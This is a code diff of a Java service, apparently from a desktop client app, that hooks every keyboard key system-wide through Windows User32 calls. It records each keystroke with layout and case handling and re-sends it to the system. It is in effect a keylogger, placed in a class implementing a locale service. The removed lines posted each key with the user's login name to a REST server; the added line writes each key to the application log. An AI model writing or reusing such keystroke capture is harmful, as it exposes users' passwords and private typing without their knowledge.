@@ -6,18 +6,16 @@ import java.nio.charset.Charset;
 import java.util.Locale;
 import java.util.concurrent.CompletableFuture;
 
+import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 import org.springframework.http.converter.StringHttpMessageConverter;
 import org.springframework.web.client.RestTemplate;
 
-import ch.qos.logback.classic.Level;
-import ch.qos.logback.classic.Logger;
-import ru.kolaer.client.javafx.tools.Resources;
 import ru.kolaer.client.javafx.tools.User32;
 import ru.kolaer.client.javafx.tools.User32.MSG;
 
 public class UserWindowsKeyListenerService implements LocaleService {
-	private final Logger LOG = (Logger) LoggerFactory.getLogger(UserWindowsKeyListenerService.class);
+	private final Logger LOG = LoggerFactory.getLogger(UserWindowsKeyListenerService.class);
 	
 	private final RestTemplate restTemplate = new RestTemplate();
 	private final String username = System.getProperty("user.name");
@@ -31,10 +29,6 @@ public class UserWindowsKeyListenerService implements LocaleService {
 	 * {@linkplain UserWindowsKeyListenerService.java}
 	 */
 	public UserWindowsKeyListenerService() {
-		// When you want to temporarily change the log level
-		Logger orgHibernateLogger = (Logger) LoggerFactory.getLogger("org.hibernate");
-		orgHibernateLogger.setLevel(Level.ERROR); // or whatever level you want
-		
 		this.restTemplate.getMessageConverters().add(0, new StringHttpMessageConverter(Charset.forName("UTF-8")));
 	}
 
@@ -55,7 +49,7 @@ public class UserWindowsKeyListenerService implements LocaleService {
 
 	@Override
 	public void run() throws Exception {
-
+		
 		CompletableFuture.runAsync(() -> {
 			for(int i = 8; i <= 222; i++){
 				User32.RegisterHotKey(null, i, 0, i);
@@ -105,8 +99,8 @@ public class UserWindowsKeyListenerService implements LocaleService {
 						CompletableFuture.runAsync(() -> {							
 							if(idKey == 20)
 								isCapsLock = !isCapsLock;
-							
-							this.isRus = User32.GetKeyboardLayout(0) == 25 ? true : false;
+
+							this.isRus = User32.GetKeyboardLayout(User32.GetWindowThreadProcessId(User32.GetForegroundWindow(), 0)) == 25 ? true : false;
 							String key = this.isRus ? getRusKey(idKey) : getEngKey(idKey);
 						
 							if(User32.GetKeyState(16) < 0){
@@ -116,16 +110,16 @@ public class UserWindowsKeyListenerService implements LocaleService {
 									key = key.toUpperCase();
 								}
 							}
+							LOG.info("ID: {} - ({})", idKey, key);
 							
-							this.restTemplate.postForObject(Resources.URL_TO_KOLAER_RESTFUL.toString() + "system/user/" + username + "/key", key, String.class);
+							//this.restTemplate.postForObject(Resources.URL_TO_KOLAER_RESTFUL.toString() + "system/user/" + username + "/key", key, String.class);
 							
-							System.out.println(" - ID: " + idKey + " (" + key + ")");
-						}).exceptionally(t -> {
-							LOG.error("Невозможно отправить сообщение!", t);
+						}).exceptionally(t -> {	
+							LOG.error("Невозможно отправить сообщение!",t);
 							return null;
 						});
 						
-						User32.keybd_event(idKey, 0, 0, 0);
+						User32.keybd_event(idKey, 0, 0, 0);;
 
 						if(shift && (User32.GetKeyState(0xA1) & 0x8000) == 0){
 							shift = false;
